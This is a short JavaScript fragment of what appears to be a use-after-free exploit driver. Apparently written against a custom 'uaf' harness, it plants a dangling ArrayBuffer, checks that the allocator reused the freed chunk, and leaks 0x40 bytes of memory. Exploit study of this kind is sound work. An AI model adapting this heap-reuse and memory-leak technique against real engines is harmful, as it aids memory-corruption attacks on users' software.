print('[*] status before = ' + JSON.stringify(uaf.status()));
print('[*] preparing dangling ArrayBuffer');
uaf.prepare();

let info = uaf.plant();
print('[*] plant result = ' + JSON.stringify(info));
if (!info.reused) {
    throw new Error('allocator did not recycle the freed chunk this time');
}

let leak = uaf.read(0x40);
print('[*] leak = ' + leak.replace(/\u0000+$/, ''));
